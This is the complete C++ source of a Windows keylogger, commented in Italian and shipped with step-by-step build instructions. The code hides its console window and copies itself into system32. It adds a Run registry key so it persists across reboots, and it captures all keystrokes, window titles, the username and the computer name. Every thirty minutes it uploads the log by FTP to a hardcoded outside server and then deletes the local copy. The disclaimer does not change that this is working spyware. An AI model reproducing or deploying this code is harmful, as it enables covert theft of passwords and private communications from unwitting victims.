/*
  __GiReX__  Remote  Keylogger 3
  Keylogger remoto con upload del log via FTP
  
  L'autore non si assume la responsabilità circa l'uso
  scorretto di tale sorgenti, nè il keylogger
  verrà distribuito in modalità eseguibile (compilato).
  
  Per compilare da Dev-Cpp:
      Creare un nuovo progetto Console Application (C++)
      Incollare nel main.cpp il seguente sorgente
      Cambiare con i propri dati le 4 righe dei  #define (qui sotto)
      Progetto->Opzioni del Progetto->Parametri
      Sulla destra (Linker) cliccare su aggiungi libreria o oggetto
      Cercare nella cartella lib di Dev-Cpp  la libreria  *libwininet.a*
      Selezionarla e cliccare su Apri
      Compilare (F9)
*/

#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <ctime>

#define  TARGET         "ftp.keyloggeriti.altervista.org"   /* Change with your FTP host */
#define  USERNAME       "keyloggeriti"                  /* Change with your FTP username */
#define  PASSWORD       "1Keylogger"             /* Change with your FTP password */

using namespace std;    


char logPath[255] = {0};

int infect_sys(char *prog_name);
int write_log(char c);
int write_log(char *s, bool timed = false);  
void GetRemoteLogName(char *str);  
void open_log(void);
void logWindowName(void);
bool isShifted(void);

DWORD WINAPI ftp_upload(LPVOID lpParam)
{ 
    char rLog[255] = {0};
    HINTERNET hCon, sFtp;
    
    while(true)
    {
        hCon = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     
        if(hCon == NULL) 
        {
              write_log("\n[!] Errore nello stabilire la connessione: ", true);
              Sleep(1000 * 60);
              continue;
        }
    
        sFtp = InternetConnect(hCon, TARGET, INTERNET_DEFAULT_FTP_PORT, USERNAME, PASSWORD, INTERNET_SERVICE_FTP, 0, 0);
     
        if(sFtp == NULL) 
        {
              write_log("\n[!] Errore nello stabilire la sessione FTP: ", true);
              Sleep(1000 * 60);
              continue;
        }
        
        GetRemoteLogName( rLog );
     
        if(!FtpPutFile(sFtp, logPath, rLog, INTERNET_FLAG_TRANSFER_BINARY, 0))
        {
              write_log("\n[!] Errore nell'upload del file: ", true);
              InternetCloseHandle(hCon);
              InternetCloseHandle(sFtp);
              Sleep(1000 * 60);
              continue;
        }
        else
        {
              DeleteFile(logPath);
              open_log();
        }
 
        InternetCloseHandle(hCon);
        InternetCloseHandle(sFtp);
  
        Sleep(1000 * 60 * 30);
   }
   
}

int main(int argc, char *argv[])
{
    bool shift;
    char keyName[25];
    
    HANDLE hThread;
    
    if(!GetSystemDirectory(logPath, 255))
    {
         write_log("\n[!] Errore nell'ottenere il percorso della cartella system32: ", true);
         sprintf(logPath, "C:\\WINDOWS\\system32\\key_log.txt");
    }
    else
    strcat(logPath, "\\key_log.txt"); 
    
    open_log();
    infect_sys(argv[0]);
    
    hThread = CreateThread(NULL, 0, ftp_upload, NULL, 0, (DWORD*) 0);
    
    if(hThread == NULL)
    {
         write_log("\n[!] Errore nella creazione del thread: ", true);
    }
    
    while(true)
    {                     
       for(int i = 8; i <= 256; i++)
       {
           if(GetAsyncKeyState(i) & 0x7FFF)
           {       
                logWindowName();    
                shift = isShifted();
                     
                if(i > 47 && i < 91)
                {
                      if(shift == false) write_log(tolower(i));
                      else write_log((char) i);
                }
                else
                {   
                    switch(i)
                    {
                         case VK_RETURN:
                              write_log("[ENTER]\n");
                              break;
                         case VK_SPACE:
                              write_log(" ");
                              break;
                         case VK_BACK:
                              write_log("[DEL]");
                              break;
                         case VK_SHIFT:
                         case VK_LSHIFT:
                         case VK_RSHIFT:
                         case VK_CAPITAL:
                              break;
                        default:                           
                              GetKeyNameText(MapVirtualKey(i, 0) << 16, keyName, 25);
                                 
                              if(strlen(keyName) < 2)  write_log(keyName);
                              else 
                              { 
                                   write_log('[');
                                   write_log(keyName);
                                   write_log(']');
                              }
                     }
                                                
                }  
                     
           }                                         
      }  
                                    
     Sleep(10);                  
    }
      
    return 0;
}

void open_log(void)
{
  DWORD bSize = 255; 
  const char intro[] = "[+]   __GiReX__ Remote Keylogger 3\n";
    
  char userName[255], pcName[255];   
    
  write_log((char *) intro);
  
  GetComputerName(pcName, &bSize);  
  GetUserName(userName, &bSize);
  
  write_log("\n[+] Username:\t\t");
  write_log(userName);
  
  write_log("\n[+] Nome del Computer:\t");
  write_log(pcName);
  write_log("\n");
  
  write_log("[+] Start Time:\t\t", true);
}

int infect_sys(char *prog_name)
{
  HKEY hKey;
  HWND hWnd;
  char destPath[255];

  hWnd = FindWindow("ConsoleWindowClass", NULL);
  ShowWindow(hWnd, SW_HIDE);
  
  if(!GetSystemDirectory(destPath, 255))
  {
         write_log("\n[!] Errore nell'ottenere il percorso della cartella system32: ", true);
         sprintf(destPath, "C:\\WINDOWS\\system32\\%s", "keylog.exe");
  }
  else
  {   
         strcat(destPath, "\\");
         strcat(destPath, "keylog.exe");
  }
  
  if(!CopyFile(prog_name, destPath, FALSE)) 
  { 
         write_log("\n[!] Errore nel copiare il keylogger nella cartella system32: ", true);
         return 1;
  } 
 
  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey)
     !=  ERROR_SUCCESS)
  {
         write_log("\n[!] Errore nella creazione della chiave di registro: ", true);
         return 1;
  }
  
  if(RegSetValueEx(hKey, "keylog", 0, REG_SZ, (const unsigned char*) destPath, strlen(destPath))
     !=  ERROR_SUCCESS)
  {
         write_log("\n[!] Errore nella creazione della chiave di registro: ", true);
         RegCloseKey(hKey);
         return 1;
  }
  
  RegCloseKey(hKey);
  return 0;
}

int write_log(char c)
{
    ofstream logFile(logPath, ios::out | ios::app);
    
    if(!logFile.is_open())
    {
         return 1;
    }
    
    logFile << c;
    
    logFile.flush();
    logFile.close();
    
    return 0;
}
    
int write_log(char *s, bool timed)
{
    time_t cTime;
    ofstream logFile(logPath, ios::out | ios::app);
    
    if(!logFile.is_open())
    {
         return 1;
    }
    
    logFile << s;
    if(timed == true) 
    {
            time ( &cTime );
            logFile << ctime( &cTime );
    }
    
    logFile.flush();
    logFile.close();
    
    return 0;
}

void logWindowName(void)
{
   static HWND hWnd = NULL;
   char wName[255] = {0};
   
     if(hWnd != GetForegroundWindow())
       {     
           hWnd = GetForegroundWindow();
           if(GetWindowText(hWnd, wName, 255))
           {
                  write_log("\n\n[+] Finestra: ");
                  write_log(wName);
                  write_log("\n\n");
           }     
       }
}

void GetRemoteLogName(char *str)
{
  DWORD size = 55;
  char cName[55], cTime[55];
  
  time_t rawtime;
  struct tm * timeinfo;
  
  time ( &rawtime );
  timeinfo = localtime ( &rawtime );
  
  GetComputerName(cName, &size);
  strftime(cTime, 55, "%d:%m_%H:%M", timeinfo);
  
  sprintf(str, "%s_%s.log", cName, cTime);
}
  

bool isShifted(void)
{
     
     if((GetKeyState(VK_LSHIFT) | GetKeyState(VK_RSHIFT)) & 0x8000)
     {
            if(GetKeyState(VK_CAPITAL)) return false;
            else  return true;      
     }
     else
     {
            if(GetKeyState(VK_CAPITAL)) return true;
            else  return false;
     }
}
